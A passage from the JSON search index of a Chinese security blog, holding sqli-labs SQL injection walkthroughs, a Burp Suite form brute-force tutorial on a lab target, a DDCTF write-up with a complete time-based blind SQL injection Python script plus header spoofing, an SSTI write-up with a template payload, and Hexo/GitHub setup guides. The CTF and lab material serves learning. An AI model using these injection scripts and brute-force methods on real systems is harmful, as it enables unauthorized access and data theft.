进一步验证是否为此类结构测试index.php?id=1&#39;)--+看是否报错 OK！页面正常，证明猜测的语句没有问题 接下来就是老套路了，order by猜测字段数我这里偷懒了，直接测试order by 3和order by 4可以证明有三个字段数 查询回显位： 接下来的操作跟前面一样，所以我还是直接最终步骤。为了测试效果不一样，我取users表第三行数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-2通关笔记","slug":"sqli-labs-less2","date":"2018-10-19T05:18:32.000Z","updated":"2018-10-19T05:19:46.728Z","comments":true,"path":"2018/10/19/sqli-labs-less2/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less2/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-2)废话不多说，我准备做一个关于mysql注入的一个终极教程，但是由于自己要不断学习，先把sqli-labs给都练一遍再来总结和写作。我想用最简单，精炼的文字让别人学会sql注入这项攻击手法。加油！ 先单引号测试，看报错信息 发现这题的sql语句类似：select * from users where id = $id limit 0,1所以并不用进行闭合语句 ok，接着测试and 1=1 和and 1=2看看会不会产生逻辑错误、可以看到，and 1=2返回页面为空值，所以可以判定为注入点 那么再来判断字段数，利用order by语句 可以看到，在进行order by 4的时候提示错误信息——没有四个字段，证明字段数为：3 接下来就来测试回显位：可以看到回显位为2和3 接下来的操作跟less-1就一样了，我直接上最终步骤为了证明注入成功，我取users表第二个数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"暴力破解表单-无验证码","slug":"crack-form","date":"2018-10-18T02:58:39.000Z","updated":"2018-10-18T03:01:22.487Z","comments":true,"path":"2018/10/18/crack-form/","link":"","permalink":"https://leaderzhang.github.io/2018/10/18/crack-form/","excerpt":"","text":"表单暴力破解——无验证码“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的! 你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。 从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基 环境准备：pikachu靶机环境工具准备：Burp Suite 打开搭建好的靶机环境：选择表单破解类中的基于表单的暴力破解 我们先对登陆框进行基本的Fuzz 账号或密码错误时的提示信息:username or password is not exists～ 进行抓包分析，可以看到POST了三个值，username=xxx、password=xxx、submit=login其中submit参数是校验表单提交的，为固定值 接下来，把数据包发送到Intruder中去 攻击类型选择Cluster bomb 清除工具自动识别的变量 设置需要爆破的参数变量 设置payloads加载模式 参数1选择simple list 参数2同样设置然后参数1选择load加载字典文件，加载用户名字典，参数2加载密码字典。设置好后点击Start Attack即可 根据length返回的不同值来判断是否为正确账号密码一般来说，不一样的就是正确的账号密码啦~当然还可以通过Grep Match选项来匹配","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"https://leaderzhang.github.io/categories/WEB安全/"}],"tags":[{"name":"暴力破解","slug":"暴力破解","permalink":"https://leaderzhang.github.io/tags/暴力破解/"}]},{"title":"sqli-labs-less-1通关笔记","slug":"sqli-labs-less1","date":"2018-10-17T02:47:52.000Z","updated":"2018-10-17T02:50:29.281Z","comments":true,"path":"2018/10/17/sqli-labs-less1/","link":"","permalink":"https://leaderzhang.github.io/2018/10/17/sqli-labs-less1/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-1) 因为我的知识比较杂而不精，每次遇到SQL注入题都是sqlmap一把梭。这样对于技术层面没有多大的帮助，而且我用sqlmap也不深，像一些tamper类型的参数，我也并不熟练。我还是决定回归基础，好好的把sql注入学习一下。 平台选择：&emsp;&emsp;Sqli-Labs&emsp;&emsp;这是一款学习sql注入经典的平台，里面的sql注入类型基本都有。工具选择：&emsp;&emsp;火狐浏览器-Hackbar（手工注入利器） Less-1首先，分析参数，题目有提示： Please input the ID as parameter with numeric value OK，给个id为1的值。在网页url后输入?id=1可以看到页面产生了变化。 and 1=1测试 页面正常显示： and 1=2测试 页面非正常显示： 猜测字段数 可以看到，在进行order by 4测试的时候，页面报错。大致意思是没有第四个字段能被order命令显示。所以我们确定，该表字段数为3个。 测试显示位 得到显示位为2和3 猜测数据库名得到数据库名为：security 读取表名 读取users表字段名获取到字段名id,username,password 读取users表第三条数据内容获取第三条数据内容，username：Dummy|password：p@ssword 数据库验证结果：","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"DDCTF WEB1 数据库的秘密","slug":"DDCTF-WEB1-writeup","date":"2018-10-15T15:13:49.000Z","updated":"2018-10-16T02:48:06.918Z","comments":true,"path":"2018/10/15/DDCTF-WEB1-writeup/","link":"","permalink":"https://leaderzhang.github.io/2018/10/15/DDCTF-WEB1-writeup/","excerpt":"","text":"#DDCTF WEB1 数据库的秘密 最近的比赛很多，但是成绩都不是很好，准备安心的学习一段时间。。。 所以，想重新做一下一些有质量的ctf题目。 DDCTF的环境没有关（真的很良心~） 所以我准备把DDCTF的题目重新做一遍 #WEB1 数据库的秘密 1.绕过XFF靶机：http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php 首先提示 非法链接，只允许来自 123.232.23.245 的访问 所以想到XFF绕过，将headers的头部添加 X-Forwarded-For:123.232.23.245 2.寻找可利用点进来后发现是一个表格，有三个文本框和一个按钮。任意提交内容时，发现url中有sig和time参数 进行抓包分析时，发现会请求两个js文件，并且有一个隐藏表单“author”也被提交了。 查看源码可以找到两个js文件的地址和一个key值 分析math.js时可以看出，应该是一个加密程序，并且需要传递key值和data表单数据进去，然后js会返回sig数据。 对id或者title等参数进行fuzz时，会发现有防火墙。并且过滤了一些字符，但是我发现，它这个WAF不是根据单个字符串来判定，而是通过 1’ and 1=1#1’ and union select 这些组合式的语句进行拦截 根据经验，这是个Nginx+lua_waf，github上有Bypass教程 但是这个waf也可以绕过 联合查询的固定语句是 union select 所以靠联合查询是不行的。 那就利用盲注来实行SQL注入。 布尔型和时间型都可以，根据个人爱好来选择。。 我们对author这个参数进行注入，因为题目把它隐藏应该有一定道理的。 贴上一位大神的思路，他用php来中转参数进行注入，先用php处理参数，构建带有sig和time参数的url，然后让sqlmap来跑。https://www.anquanke.com/post/id/144879 我的脚本是基于时间注入的，因为我用布尔注入，TMD要么被拦截，要么不返回注入该有的页面。 import execjs import requests as req import time flag = '' url=\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig=\" headers = { \"X-Forwarded-For\": \"123.232.23.245\" } def get_sig(author): js = req.get(\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/static/math.js\").text ctx = execjs.compile(js) key=\"\\141\\144\\162\\145\\146\\153\\146\\167\\145\\157\\144\\146\\163\\144\\160\\151\\162\\165\" times = str(int(time.time())) data = \"id={id}title={title}author={author}date=time={time}\".format(id=\"\",title=\"\",time=times,author=author) return (ctx.call('hex_math_enc',data+key)) def check(sqlin): time1 = str(int(time.time())) sig = get_sig(sqlin) new_url = url +sig+ \"&time=\" + time1 post_data = { 'id':'', 'title':'', 'author':sqlin, 'date':'', 'button':'search' } reqs = req.post(url=new_url,data=post_data,headers=headers) data = reqs.content.decode('utf-8') if \"sig\" in data: print(\"sig error\") if \"time\" in data: print(\"time error\") if \"防火墙\" in data: print(\"防火墙拦截\") if time.time()- startTime>1: return 1 else: return 0 def main(): global flag global startTime offset = 1 kw = 'DCTFQWERYUIOPASGHJKLZXVBMN{}_qwertyuiopasdfghjklzxcvbnm1234567890_@-' for i in range(1, 256): for j in kw: startTime = time.time() payload = \"a%' && if((selEct substr(secvalue,{0},1) from ctf_key9 )='{1}',sleep (2),1)='%\" .format(offset,j) if check(payload) ==1: flag += j offset += 1 print(flag) break if len(flag)>0 and flag[-1] == '}': break if __name__ == '__main__': main()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://leaderzhang.github.io/categories/CTF/"}],"tags":[{"name":"DDCTF","slug":"DDCTF","permalink":"https://leaderzhang.github.io/tags/DDCTF/"}]},{"title":"服务端模板注入(SSTI)学习笔记","slug":"study-ssti","date":"2018-10-13T19:02:55.000Z","updated":"2018-10-13T19:14:56.285Z","comments":true,"path":"2018/10/14/study-ssti/","link":"","permalink":"https://leaderzhang.github.io/2018/10/14/study-ssti/","excerpt":"","text":"#服务端模板注入(SSTI)学习笔记 我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。 So，模板注入这个东西的起因就是因为方便 ##如何造成的注入呢？ 学习Web安全的时候，有一条规则是大家公认的。 一切用户可控的值，都是不安全的 用这次护网杯的一道WEB题来了解SSTI easy tornado 打开网站后，是这样的：依次打开链接后得到的信息： /file?filename=Orz.txt&amp;signature=0434ba1fadd43ce31661c315fbb8a9c6 Orz.txtrender() /file?filename=hint.txt&amp;signature=78423a4ae34f2a6e9088a35ef650af22 hint.txtmd5(cookie_secret + md5(filename)) /file?filename=flag.txt&amp;signature=dbc862f7ca4cd3dd4ba82c6e7ff6d6af flag.txt/fllllllllllag 第一个Orz.txt提示render() render()是一般python Web应用框架中渲染模板的函数所以应该往SSTI方面想 第二个hint.txt提示了一段加密算法对题目基础测试的时候，会发现这一段加密算法应该就是signature的算法。 第三个flag.txt提示了flag所在的文件 我们随意读取一个文件时，他会报错，网页提示是签名错误 我们看到有一个msg的参数，对它Fuzz一波，可以发现，传的值会返回在页面上 所以想到第一个提示的render()的作用就应该在这里体现出来。 由于是tornado框架，没怎么接触过，所以我们得去官网找一找关于模板引擎的文档 可以了解到，服务端在render()函数中传递参数的值的用法1self.render(&apos;index.html&apos;, contents=CONTENTS_LIST) 在html模板文件中接收值的用法： 表示在html中取服务端的CONTENTS_LIST的内容。 接下来我们要想办法读取hint.txt里面加密算法的值 filename对应url里面的filename值 但是cookie_secret这个东西是什么？ 百度一波后知道，是tornado为了cookie的安全设置的一个值 官方对Cookie_secret这个值的解释文档 我们可以看到，当MainHandler传递值时，会创建一个名叫settings的dict，而cookie_secret就在里面。并且，settings会随着MainHandler传递到前端去。这样我们就可以构造一个payload： 1/error?msg=&#123;&#123;handler.settings&#125;&#125; 我们就可以得到cookie_secret了 然后把它用hint.txt里面的加密算法带入进去计算一下。 提示：由于cookie_secret里面有特殊字符，需要将特殊字符原封不动得带入 python脚本： 12345678910import hashlibcookie_secret=r&apos;WhzKS&#123;Z.*~k)L@XEt3UT%GB04(NAV[l1ojuD!-?]2Hg&lt;rx&#125;QmnCOpJ9+c8&gt;&amp;qI6s&apos;def md5(code): temp = hashlib.md5(str(code)).hexdigest() return tempfilename = &apos;/fllllllllllag&apos;res = md5(cookie_secret + md5(filename))print res 其实这项漏洞很早就被发现，但为什么不能被广大利用呢？因为这在真实的生产环境很少用到，在现在的网站中，已经很少有直接将用户的值直接显示在页面上的。一般都会将值实体化编码后再输入。 推荐学习的链接： web-hacking-101中文版第十六章模板注入 Burpsuite关于SSTI的用法和讲解 服务器端模板注入(SSTI) 服务端注入之Flask框架中服务端模板注入问题 Flask Jinja2开发中遇到的的服务端注入问题研究 python 模板注入","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"https://leaderzhang.github.io/categories/WEB安全/"}],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://leaderzhang.github.io/tags/SSTI/"}]},{"title":"怎样将域名绑定到github pages 博客上","slug":"how-to-bind-domain-with-github","date":"2018-10-12T07:35:27.000Z","updated":"2018-10-12T15:08:45.314Z","comments":true,"path":"2018/10/12/how-to-bind-domain-with-github/","link":"","permalink":"https://leaderzhang.github.io/2018/10/12/how-to-bind-domain-with-github/","excerpt":"","text":"1、添加CNAME文件 在仓库根目录下添加一个CNAM文件，没有后缀名，里面内容为你的域名(如:test.com),不需要添加http/www等前缀。 ping yougithubname.github.io记录下IP地址 2、添加 DNS Service记录 去DNSPod注册个账号，添加域名，设置两个A记录。分别是@和w w w，ip地址填上个步骤获取的IP地址。 3、设置域名的DNS 在相应域名的Csutom DNS里，设置DNS service,添加两条记录f1g1ns1.dnspod.net和f1g1ns2.dnspod.net 4、漫长的等待 要全球解析生效，得等上一会了，也可以先ping一下自己的设置对不对。","categories":[{"name":"建站","slug":"建站","permalink":"https://leaderzhang.github.io/categories/建站/"}],"tags":[{"name":"github","slug":"github","permalink":"https://leaderzhang.github.io/tags/github/"}]},{"title":"Hexo+Github搭建博客","slug":"start-hexo","date":"2018-10-12T06:19:54.000Z","updated":"2018-10-12T15:06:42.044Z","comments":true,"path":"2018/10/12/start-hexo/","link":"","permalink":"https://leaderzhang.github.io/2018/10/12/start-hexo/","excerpt":"","text":"Hexo博客搭建(Hexo+Github) &emsp;&emsp;之前我的博客采用的是Emlog+Niginx+Php+Mysql方式搭建的，这样效果感觉不是很好，所以想尝试大佬们都在用的Hexo博客。不得不说，这个Hexo博客的模式，我很早之前也这么想过，因为真的很安全，不存在什么漏洞行为了，前后端彻底分离了。 &emsp;&emsp;Hexo博客 是比较方便写作的博客了，不像其他博客程序，可以变换多种，变成CMS或者小说站等等。所以，我觉得以后每天来记录我的学习情况，这样有助于技术上的成长~ &emsp;&emsp;废话不多说，搭建前的准备： 本地服务器(win7)——用于本地创作文稿 Github账号——用于存放你的博客内容 本地服务器准备阶段 因为我本地用的虚拟机(不想占用太多物理机的地方，虽然也占用不了多少。。) 虚拟机可以用linux或者windows，这个看你自己的操作习惯。本地服务器的作用其实就是用来写作，因为最终我们是要PUSH到github上面去的。 1.先下载Git,一路Next选择就ok啦~2.创建一个文件夹，用来存放本地博客。我这里取名为blog Github准备阶段 Github是全球最大的基友社交平台。So….怎么能少了我们呢？？ 1.创建github账号2.Create a new repository3.Repository name填写:leaderzhang.github.io （自行替换leaderzhang字符串）4.记得勾选一下Initialize this repository with a README 开始搭建 因为我本地是Windows环境，所以安装的Node.js是Node for windows，centos、ubuntu等系统安装Node.js的话很快，一条命令就ok。so，自行百度解决~ 1.先在本地服务器上下载Node.js——LTS是稳定版，Current是最新版 2.打开Git Bash 输入命令，修改npm的registry为淘宝镜像。1npm config set registry &quot;https://registry.npm.taobao.org&quot; 3.查看npm版本1npm -v 4.进入blog文件夹，输入命令，安装Hexo 在blog文件夹右键Git Bash Here，然后输入：1npm install -g hexo-cli 5.安装Hexo博客程序 在blog文件夹下输入1hexo init 安装完后就会出现以下目录结构 ├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml网站的 配置 信息，您可以在此配置大部分的参数。package.json应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。scaffolds模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。source资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。themes主题文件夹。Hexo 会根据主题来生成静态页面。 啥都先别管，咱先接着来~ 6.在本地生成git ssh密钥书以及配置Git的账户名和邮箱 &emsp;在Git Bash中输入:12345678git config --global user.name &quot;leaderzhang&quot; //设置账户名git config --global user.email &quot;xxxx@xx.com&quot; //设置账户邮箱ssh-keygen -t rsa -C &quot;youremail@example.com&quot; //生成证书文件 连续三个回车就行，密码为空cd ~/.ssh 有两个文件，id_rsa和id_rsa.pubcat id_rsa.pub //复制里面的内容 7.将id_rsa.pub的内容复制到github里&emsp;1)打开github&emsp;2)点击右上角头像,点击settings进入设置&emsp;3)点击SSH and GPG keys&emsp;4)点击New ssh keys&emsp;5)粘贴进去即可 8.在Git Bash中验证key是否正确1ssh -T git@github.com 如果没什么错误，会看到hi!Hello,xxxx等字样 9.修改_config.yml文件 用编辑器打开你的blog项目，修改_config.yml文件的一些配置(冒号之后都是有一个半角空格的)：1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 10.启动Hexo 在blog文件夹下，分别执行下列命令：1234567hexo clean //清除缓存文件hexo generate //生成静态文件。简写为 hexo ghexo server //启动服务器。默认情况下，访问网址为： http://localhost:4000/。 选项 描述 -p, --port 重设端口 -s, --static 只使用静态文件 -l, --log 启动日记记录，使用覆盖记录格式 这时候，打开localhost:4000即可看到惊艳的Hexo博客了 11.把博客放到Github上&emsp;&emsp;先安装一波：install hexo-deployer-git --save```123（这样才能将你写好的文章部署到github服务器上并让别人浏览到）执行命令(建议每次都按照如下步骤部署)：在blog文件夹下，输入以下命令： hexo cleanhexo generatehexo deploy //注意deploy的过程中要输入你的username及passward` 在浏览器中输入 yourgithubname.github.io 就可以看到你的个人博客啦，是不是很兴奋！感觉gitbash中东西太多的时候输入clear命令清空 文章来自1eAder创作，转载请联系本人 作者 @1eAder2018 年 10月 11日","categories":[{"name":"建站","slug":"建站","permalink":"https://leaderzhang.github.io/categories/建站/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://leaderzhang.github.io/tags/Hexo/"}]}]}